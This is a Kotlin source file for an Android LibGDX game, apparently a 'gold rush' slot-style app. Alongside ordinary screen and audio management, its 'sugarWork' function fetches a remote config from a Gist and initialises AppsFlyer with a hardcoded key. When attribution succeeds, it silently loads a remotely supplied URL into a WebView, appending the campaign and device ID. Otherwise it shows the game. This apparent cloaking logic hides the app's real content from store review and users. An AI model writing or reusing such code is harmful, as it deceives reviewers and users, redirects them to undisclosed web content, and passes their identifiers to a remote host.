package com.fortunepieces.goldrushbig.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.fortunepieces.goldrushbig.MainActivity
import com.fortunepieces.goldrushbig.appContext
import com.fortunepieces.goldrushbig.game.manager.MusicManager
import com.fortunepieces.goldrushbig.game.manager.NavigationManager
import com.fortunepieces.goldrushbig.game.manager.SoundManager
import com.fortunepieces.goldrushbig.game.manager.SpriteManager
import com.fortunepieces.goldrushbig.game.manager.util.MusicUtil
import com.fortunepieces.goldrushbig.game.manager.util.SoundUtil
import com.fortunepieces.goldrushbig.game.manager.util.SpriteUtil
import com.fortunepieces.goldrushbig.game.screens.LoaderScreen
import com.fortunepieces.goldrushbig.game.utils.GameColor
import com.fortunepieces.goldrushbig.game.utils.advanced.AdvancedGame
import com.fortunepieces.goldrushbig.game.utils.disposeAll
import com.fortunepieces.goldrushbig.game.utils.gdxGame
import com.fortunepieces.goldrushbig.util.Gist
import com.fortunepieces.goldrushbig.util.log
import kotlinx.coroutines.*
import java.util.concurrent.atomic.AtomicBoolean

var GDX_GLOBAL_isGame = false
    private set

var GDX_GLOBAL_isLoadAssets = false
var GDX_GLOBAL_isPauseGame  = false

var GDX_ORIGINAL_LINK = ""
    private set

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("Prefs", MODE_PRIVATE)

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        sugarWork()
    }

    override fun render() {
        if (GDX_GLOBAL_isPauseGame) return

        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    override fun pause() {
        log("pause")
        super.pause()
        GDX_GLOBAL_isPauseGame = true
        if (GDX_GLOBAL_isLoadAssets) musicUtil.currentMusic?.pause()
    }

    override fun resume() {
        log("resume")
        super.resume()
        GDX_GLOBAL_isPauseGame = false
        if (GDX_GLOBAL_isLoadAssets.not()) musicUtil.currentMusic?.play()
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun sugarWork() {
        log("sugarWork start")
        activity.webViewHelper.blockRedirect = { GDX_GLOBAL_isGame = true }
        activity.webViewHelper.initWeb()

//        GDX_GLOBAL_isGame = true
//        return

        val savedData = sharedPreferences.getString("brawo", "limmo") ?: "limmo"

        try {
            if (savedData == "limmo") {
                coroutine.launch(Dispatchers.Main) {
                    val AF_KEY  = "GQpsCfphPxPKfnNyibc9rB"
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    log("json: $getJSON")

                    if (getJSON != null) {
                        AppsFlyerLib.getInstance().init(AF_KEY, getAppsFlyerConversionListener(getJSON.link), appContext)
                        AppsFlyerLib.getInstance().start(gdxGame.activity, AF_KEY, getAppsFlyerRequestListener())
                    } else {
                        GDX_GLOBAL_isGame = true
                    }
                }
            } else {
                activity.webViewHelper.loadUrl(savedData)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GDX_GLOBAL_isGame = true
        }

    }

    private fun getAppsFlyerConversionListener(startLink: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"] as? String
                val afId     = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                log("Result: campaign = $campaign | appfMap = $appfMap")

                val link = "$startLink?campaign=$campaign&afId=$afId"
                log("link = $link")

                //coroutine.launch(Dispatchers.IO) { sharedPreferences.edit { putString("brawo", link) } }

                GDX_ORIGINAL_LINK = link
                activity.webViewHelper.loadUrl(link)

            } else GDX_GLOBAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GDX_GLOBAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
            GDX_GLOBAL_isGame = true
        }
    }

}